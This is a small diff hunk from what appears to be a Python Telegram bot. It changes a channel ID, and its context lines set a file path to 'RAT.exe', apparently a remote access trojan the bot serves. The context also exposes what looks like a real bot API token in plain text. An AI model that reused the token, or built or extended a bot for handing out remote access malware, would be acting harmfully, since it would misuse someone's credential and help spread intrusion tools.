@@ -6,7 +6,7 @@ from telebot import types
 API_TOKEN = '7138095299:AAH3YEgptfE-Me22NR6jpeZJZWiihXfbWPY'
 
 # Замените на ID вашего канала
-CHANNEL_ID = '-1002331312384'
+CHANNEL_ID = '1002331312384'
 
 # Замените на путь к вашему файлу RAT.exe
 RAT_FILE_PATH = 'RAT.exe'
